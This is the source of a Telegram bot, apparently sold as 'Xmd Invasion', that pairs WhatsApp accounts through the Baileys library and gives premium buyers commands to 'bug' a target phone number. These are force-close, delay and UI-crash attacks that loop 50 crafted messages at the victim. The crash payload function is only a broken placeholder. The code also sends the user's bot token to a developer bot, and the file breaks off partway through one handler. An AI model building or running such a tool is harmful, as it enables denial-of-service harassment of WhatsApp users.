const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    cardsCrL,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    encodeSignedDeviceIdentity,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const fs = require("fs");
const readline = require('readline');
const P = require("pino");
const crypto = require("crypto");
const chalk = require('chalk');
const path = require("path");
const imgcrl = fs.readFileSync(`./ytta/o.jpg`);
const fetch = require('node-fetch');
const TelegramBot = require("node-telegram-bot-api");
const moment = require('moment-timezone');
//------ Setting foto pas bug di sini -------//
const thumbnailUrl = 'https://files.catbox.moe/k4w0oa.jpg';
//------- fungsi delay pada cmd bisa di pakai juga di yg lain ---\\
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
//----------- save sesion ------------//
const SESSIONS_DIR = "./ytta/sessions";
const SESSIONS_FILE = "./ytta/sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

//------- Fungsi connect ke WhatsApp bila Nemu sesion ---------//
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`╭───────────────────────────────\n│ gw nemu ${activeNumbers.length} sesi WhatsApp aktif ini\n╰───────────────────────────────`);

      for (const botNumber of activeNumbers) {
        await connectWithRetry(botNumber);
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

//----------- fungsi buat reconect ke WhatsApp -----------//
async function connectWithRetry(botNumber, attempt = 1, maxAttempts = 3) {
  const sessionDir = createSessionDir(botNumber);
  
  try {
    console.log(`╭───────────────────────────────\n│menghubungkan: ${botNumber} Percobaan ${attempt}/${maxAttempts}\n╰───────────────────────────────`);

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: P({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    const isConnected = await new Promise((resolve) => {
      const timeout = setTimeout(() => {
        sock.ev.off('connection.update', connectionHandler);
        resolve(false);
      }, 10000); 

      const connectionHandler = (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
          clearTimeout(timeout);
          console.log(`┃ Bot ${botNumber} terhubung! ┃`);
          sessions.set(botNumber, sock);
          sock.ev.on("creds.update", saveCreds);
          resolve(true);
        } else if (connection === "close") {
          clearTimeout(timeout);
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          resolve(shouldReconnect ? false : 'loggedOut');
        }
      };

      sock.ev.on('connection.update', connectionHandler);
    });

    if (isConnected === true) {
      return; 
    } else if (isConnected === 'loggedOut') {
      throw new Error('Logged out');
    }

    if (attempt < maxAttempts) {
      await new Promise(resolve => setTimeout(resolve, 2000)); 
      return connectWithRetry(botNumber, attempt + 1, maxAttempts);
    } else {
      throw new Error('Gagal setelah 3x percobaan cok pair ulang');
    }

  } catch (error) {
    console.error(`╭───────────────────────────────\n│Eror di bot bg ${botNumber}: ${error.message}\n╰───────────────────────────────`);

    if (attempt >= maxAttempts || error.message === 'Logged out') {
      console.log(`╭───────────────────────────────\n│Menghapus sesi buat bot ini jir ${botNumber}...\n╰───────────────────────────────`);
      
      if (fs.existsSync(SESSIONS_FILE)) {
        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
        const updatedNumbers = activeNumbers.filter(num => num !== botNumber);
        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
      }
      
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      console.log(`╭───────────────────────────────\n│Sesi bot ${botNumber} udah gw apus\n╰───────────────────────────────`);
    }
  }
}

//------------- fungsi piring ke WhatsApp -------------//
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`MULAI\bCONNECT\bNIH BANG\n────────────────\nBot: ${botNumber}\nStatus: Mulai koneksi nih\n────────────────\n© KyzzexX\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
         `\`\`\`BENTAR\bBG\bMENCOBA\bRECORNETING\n────────────────\nBot: ${botNumber}\nStatus: Recorneting bg\n────────────────\n© KyzzexX\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`KONEKSI\bGAGAL\bCOK\n────────────────\nBot: ${botNumber}\nStatus: Gabisa terhubung jir\n────────────────\n© KyzzexX\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
    sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`SUKSES\bTERHUBUNG BG\n────────────────\nBot: ${botNumber}\nStatus: Berhasil terhubung bg\n────────────────\n© KyzzexX\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
    let customcode = "XMDNIBOS"
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, customcode );
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`KODE\bPAIRING\bNIH BG\n───────────────\nBot: ${botNumber}\nKode: ${formattedCode}\n────────────────\n© KyzzexX\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Mardown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`EROR\bCOK\bJIR\n────────────────\nBot: ${botNumber}\nPesan: ${error.message}\n────────────────\n© KyzzexX\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

sock.ev.on("creds.update", saveCreds);

  return sock;
}

const config = require('./config.js');

const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
//----- handler eror bot -------//
bot.on('polling_error', (error) => {
    console.error('Error:', error.code, error.message);
});

const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;

async function initializeBot() {
await new Promise(resolve => setTimeout(resolve, 4500));
console.clear();
console.log('\x1b[36m[Welcome To Script Xmd Invasion]\x1b[0m');
console.log(chalk.green(`≈ Status: Aktifed
≈ Developer: @kyzzexX
≈ Owner: @ditthtzy
≈ database: github
please jgn di salah gunakan.
`));
  await initializeWhatsAppConnections();
}

const premjir = './yapping/premium.json';

//------- fungsi group only -------//
bot.on("message", async (msg) => {
  if (
    msg.chat.type === "private" &&
    msg.text &&
    !msg.text.startsWith("/")
  ) {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`🚨\bWARNING\bADA\bYG\bP\bBOT**\nNama: ${msg.from.first_name}\nID: ${
        msg.from.id
      }\nUsername: @${msg.from.username || "Tidak ada"}\nTanggal: ${new Date().toLocaleString(
        "id-ID"
      )}\`\`\``,
      { parse_mode: "Markdown" }
    );
  }
});

//-------- fungsi validasi token github ---------//
// ISI ID TKN BUAT KIRIM NOTIF KE DEV (WAJIB)
const DEV_BOT_TOKEN = "ISI TOKEN DB LU YG ON"; //tokn dev
const DEV_ID = "ID DEV"; // ID dev

const devBot = new TelegramBot(DEV_BOT_TOKEN, { polling: false });

async function validateToken(token) {
  try {
    const url = "Url_raw";
    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal fetch json dari GitHub");

    const data = await response.json();

    if (!data.tokens || !Array.isArray(data.tokens)) {
      throw new Error("Format json salah bego");
    }

    return data.tokens.includes(token);
  } catch (err) {
    console.error("Error validasi token:", err.message);
    return false;
  }
}

(async () => {
  const isValid = await validateToken(BOT_TOKEN);

  const notif = isValid
    ? `✅ TOKEN VALID LOGIN\n\nTOKEN: ${BOT_TOKEN}\nID: ${OWNER_ID}`
    : `❌ TOKEN INVALID DETECTED\n\nTOKEN: ${BOT_TOKEN}\nID: ${OWNER_ID}`;

  
  await devBot.sendMessage(DEV_ID, notif).catch(() => {});

  if (isValid) {
    console.log("✅ Token valid");
    initializeBot();
  } else {
    console.log("❌ Token tidak valid");
    process.exit(1);
  }
})();

//------- definisikan file nyimpan ngub only -------//
const grubjir = "./yapping/settings.json";

function loadSettings() {
  if (!fs.existsSync(grubjir)) return { grouponlyEnabled: true };
  try {
    return JSON.parse(fs.readFileSync(grubjir));
  } catch {
    return { grouponlyEnabled: true };
  }
}

function saveSettings(settings) {
  fs.writeFileSync(grubjir, JSON.stringify(settings, null, 2));
}

const settings = loadSettings();
let grouponlyEnabled = settings.grouponlyEnabled ?? true;


//------- Handler biar tau dia chat apa pas gb only on ------//
function grouponly(cmdRegex, handler) {
  bot.onText(cmdRegex, (msg, match) => {
    if (grouponlyEnabled && msg.chat.type === "private") {
      // Kirim notif ke grup log kalau ada yg coba command di pv pas grouponly on
      bot.sendMessage(
        config.LOG_GROUP_ID,
        `\`\`\`⚠️\bWARNIG\nUser @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nnote: mencoba pakai perintah \`${msg.text}\` di Private Chat saat grouponly ON\`\`\``,
        { parse_mode: "Markdown" }
      ).catch(() => {});

   // Jangan kirim menu atau respon apapun bila gb only on
      return;
    }
    handler(msg, match);
  });
}

// --- Fungsi Premium ---
const loadPremiumUsers = () => {
    try {
        return JSON.parse(fs.readFileSync(premjir));
    } catch {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premjir, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        delete premiumUsers[userId];
        savePremiumUsers(premiumUsers);
        return true;
    }
    return false;
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) return true;
        delete premiumUsers[userId];
        savePremiumUsers(premiumUsers);
    }
    return false;
};

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

//----- fungsi simpan waktu start bot nya -----//
const startTime = Math.floor(Date.now() / 1000);

//---- fungsi ambil Runtime bot nya ------//
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//--------// fungsi ambil runtime -----------//
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//-------- fungsi ambil Date/tanggal ---------//
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options);
}

//--------- function bug --------//
async function namafunc(sock, target) {
    let message = {
        message: {
            header: {
                title: "",
                text: ""
            }
        }
    };
    await sock.relayMessage(target, message {
    messgeId: null,
    participant: { jid: target }
    });
 }
//----- Definisikan apa yg mau di gunakan -------//
const Developer = '@kyzzexX';
const version = '2.7';
const tanggal = getCurrentDate();
const RuntimeBot = getBotRuntime();

//----- fungsi atur menu ------\\
const menus = {
    main: {
        text: `\`\`\`
Ollaaaa, Selamat datang di scriptbug bot telegram by @kyzzexX selamat menikmati menu menu nyaaa.
───────────────────────────────────────
#- INFORMASI BOT
| Name bot: Xmd Invasion 
| Developer: ${Developer}
| Version: ${version}
| Runtime: ${RuntimeBot}
| tanggal: ${tanggal}

| Please pilih button di bawah bree
| credis by @kyzzexX\`\`\``,
        photo: 'https://files.catbox.moe/k4w0oa.jpg',
        parse_mode: 'Markdown',
        keyboard: [
            [
                { text: 'Bugs Menu', callback_data: 'menu_1' },
                { text: 'Owners Menu', callback_data: 'menu_2' }
            ],
            [{ text: 'Thaks To', callback_data: 'menu_3' }],
            [
                { text: 'Developer', url: 'https://t.me/kyzzexX' },
                { text: 'Owners', url: 'https://t.me/ditthtzy'}
            ]
        ]
    },
    menu_1: {
        text: `\`\`\`
Ollaaaa, Selamat datang di scriptbug bot telegram by @kyzzexX selamat menikmati menu menu nyaaa.
───────────────────────────────────────
#- INFORMASI BOT
| Name bot: Xmd Invasion 
| Developer: ${Developer}
| Version: ${version}
| Runtime: ${RuntimeBot}
| tanggal: ${tanggal}

#- Bugs Menu
≈ /delayexemde
- delay hard 
≈ /fcexemde
- forclose click
≈ /iphonexmd
- iphone bugs
≈ /uisystem
- ui blnk click not work all dev

≈ /uisystemx
- maklu
how to use /cmd 628xxxx.
| credis by @kyzzexX\`\`\``,
        photo: 'https://files.catbox.moe/k4w0oa.jpg',
        parse_mode: 'Markdown',
        keyboard: [[{ text: '⬅️ Kembali', callback_data: 'main' }]]
    },
    menu_2: {
        text: `\`\`\`
Ollaaaa, Selamat datang di scriptbug bot telegram by @kyzzexX selamat menikmati menu menu nyaaa.
───────────────────────────────────────
#- INFORMASI BOT
| Name bot: Xmd Invasion 
| Developer: ${Developer}
| Version: ${version}
| Runtime: ${RuntimeBot}
| tanggal: ${tanggal}

#- Owners Menu
≈ /addprem <id> <waktu>
- add user ke premiums

≈ /delprem <id>
- delete user premiums

≈ /addsender <number>
- add bot bugs

≈ /gbonly <on/off>
- gunakan bot khusus grub

≈ /myid
- cek id sendiri

≈ /cekid <reply pesan>
- cekid target
| credis by @kyzzexX\`\`\``,
        photo: 'https://files.catbox.moe/k4w0oa.jpg',
        parse_mode: 'Markdown',
        keyboard: [[{ text: '⬅️ Kembali', callback_data: 'main' }]]
    },
    menu_3: {
        text: `\`\`\`
Ollaaaa, Selamat datang di scriptbug bot telegram by @kyzzexX selamat menikmati menu menu nyaaa.
───────────────────────────────────────
#- INFORMASI BOT
| Name bot: Xmd Invasion 
| Developer: ${Developer}
| Version: ${version}
| Runtime: ${RuntimeBot}
| tanggal: ${tanggal}

#- Thaks To
≈ frmnzz ≈ ditth
≈ Xatanicall ≈ Wolf
≈ Zeno ≈ Arull
≈ Naww ≈ Ekik
≈ Taka ≈Ziee
≈ All partner my
≈ All buyer script, love u
| credis by @kyzzexX\`\`\``,
        photo: 'https://files.catbox.moe/k4w0oa.jpg',
        parse_mode: 'Markdown',
        keyboard: [[{ text: '⬅️ Kembali', callback_data: 'main' }]]
    }
};

// --- cmd start di sini ---
bot.onText(/\/start/, (msg) => {
    const menu = menus['main'];
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /start\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
    bot.sendPhoto(msg.chat.id, menu.photo, {
        caption: menu.text,
        parse_mode: menu.parse_mode,
        reply_markup: { inline_keyboard: menu.keyboard }
    });
});

// --- Fungsi edit menu ---
const editMenu = (chatId, messageId, menuKey) => {
    const menu = menus[menuKey];
  
    if (!menu) return;

    bot.editMessageMedia(
        {
            type: "photo",
            media: menu.photo,
            caption: menu.text,
            parse_mode: menu.parse_mode
        },
        {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: menu.keyboard }
        }
    );
};

// --- Handle callback nya ---
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;

    if (menus[data]) {
        editMenu(chatId, messageId, data);
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Menu gada jir🗿', show_alert: true });
    }

    bot.answerCallbackQuery(callbackQuery.id);
});

//--- Cmd addprem user ---//
bot.onText(/\/addprem (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /addprem\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }

     if (!config.OWNER_ID.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Khusus Owner Goblok.");
    }

    const userId = match[1];
    const duration = parseInt(match[2]);

    if (isNaN(duration)) {
        return bot.sendMessage(chatId, "Durasi nya angka per hari itu");
    }

    const expiryDate = addPremiumUser(userId, duration);
    bot.sendMessage(chatId, `✅  ${userId} Dia jadi user prem dengan waktu ${expiryDate}`);
});

//---Cmd dell user premium---//
bot.onText(/\/delprem (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /delprem\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }

     if (!config.OWNER_ID.includes(fromId)) {
        return bot.sendMessage(chatId, "❌ Khusus Owner Goblok.");
    }

    const userId = match[1];
    if (removePremiumUser(userId)) {
        bot.sendMessage(chatId, `Dia ${userId} Berhasil lu apus dari user prem`);
    } else {
        bot.sendMessage(chatId, `❌ ${userId} Dia gada di list user prem ajg.`);
    }
});
//------- cmd cek id kita -----//
bot.onText(/\/myid/, (msg) => {
  bot.sendMessage(msg.chat.id, `🆔 ID lu nih: \`${msg.from.id}\``, { parse_mode: "Markdown" });
});

//------ cmd cekid target --------\\
bot.onText(/\/cekid/, (msg) => {
  if (msg.reply_to_message) {
    bot.sendMessage(msg.chat.id, `🆔 ID target: \`${msg.reply_to_message.from.id}\``, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(msg.chat.id, "❌ Reply ke pesan target untuk cek ID.");
  }
});

// --- cmd bugs nya ---\\
bot.onText(/\/uisystem(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const fromName = msg.from.first_name || 'User';
    const xmd = match[1];
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /uisystem\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
    
     if (!isPremiumUser(fromId) && !config.OWNER_ID.includes(fromId)) {
    return bot.sendMessage(chatId, "❌ Lu bukan premium / owner goblok 🗿");
    }

    if (!xmd) return bot.sendMessage(chatId, `salah kocag yg bener gini /uisystem 628xxx`);

    const target = xmd.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMessage = await bot.sendPhoto(chatId, thumbnailUrl, {
        caption: `\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Process....
≈ Type: uisystem
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX\`\`\``,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱 Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    // eksekusi loop
    for (let i = 0; i < 50; i++) {
        await namafunc(sock, target);
        await new Promise(r => setTimeout(r, 1000));
    }

    await bot.editMessageCaption(`\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Success ✅
≈ Type: uisystem
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX\`\`\``, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱 Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });
});

bot.onText(/\/uisystemx (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const fromName = msg.from.first_name || 'User';
    const xmd = match[1];
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /uisystemx\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
    
    if (!isPremiumUser(fromId) && !config.OWNER_ID.includes(fromId)) {
    return bot.sendMessage(chatId, "❌ Lu bukan premium / owner goblok 🗿");
    }

    if (!xmd) return bot.sendMessage(chatId, `salah kocak yg bener gini /uisystem 628xxx`);

    const target = xmd.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    
    const processMessage = await bot.sendPhoto(chatId, thumbnailUrl, {
        caption: `\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Process....
≈ Type: uisystemx
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱 Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
        await namafunc(sock, target); 
        await sleep(1000);
    }

    await bot.editMessageCaption(`\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Succes
≈ Type: uisystemx
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });
});

bot.onText(/\/delayexemde (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const fromName = msg.from.first_name || 'User';
    const xmd = match[1];
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /delayexemde\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
    
    if (!isPremiumUser(fromId) && !config.OWNER_ID.includes(fromId)) {
    return bot.sendMessage(chatId, "❌ Lu bukan premium / owner banh 🗿");
    }
    if (!xmd) return bot.sendMessage(chatId, `salah kocak yg bener gini /delayexemde 628xxx`);

    const target = xmd.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    
    const processMessage = await bot.sendPhoto(chatId, thumbnailUrl, {
        caption: `\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Process....
≈ Type: delayexemde
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱 Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
        await namafunc(sock, target); 
        await sleep(1000);
    }

    await bot.editMessageCaption(`\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Process....
≈ Type: delayexemde
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });
});

bot.onText(/\/fcexemde(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const fromName = msg.from.first_name || 'User';
    const xmd = match[1];
    
     if (grouponlyEnabled && msg.chat.type === "private") {
    bot.sendMessage(
      config.LOG_GROUP_ID,
      `\`\`\`⚠️-WARNING-ADA-YANG-PV-BOT‼️\nUSERNAME: @${msg.from.username || msg.from.first_name}\nID: ${msg.from.id}\nCMD: /fcexemde\`\`\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});
    return;
  }
    
   if (!isPremiumUser(fromId) && !config.OWNER_ID.includes(fromId)) {
    return bot.sendMessage(chatId, "❌ Lu bukan premium / owner banh 🗿");
   }

    if (!xmd) return bot.sendMessage(chatId, `salah kocak yg bener gini /fcexemde 628xxx`);

    const target = xmd.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    
    const processMessage = await bot.sendPhoto(chatId, thumbnailUrl, {
        caption: `\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Succes
≈ Type: fcexemde
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: "📱 Click To View Target", url: `https://wa.me/${xmd}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
        await namafunc(sock, target); 
        await sleep(1000);
    }

    await bot.editMessageCaption(`\`\`\`X\bM\bD\bI\bN\bV\bA\bS\bI\bO\bN
─ Ollaa, ${fromName} Status bug nya di bawah yaaa, mohon gunakan dengan baik. salam @kyzzexX
#- Information Bugs
≈ Target: ${xmd}
≈ Status: Succes
≈ Type: fcexemde
Click the button below to find out your target.\`\`\`
\`\`\`- Credits by @kyzzexX
\`\`\``, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: 'Markdown',
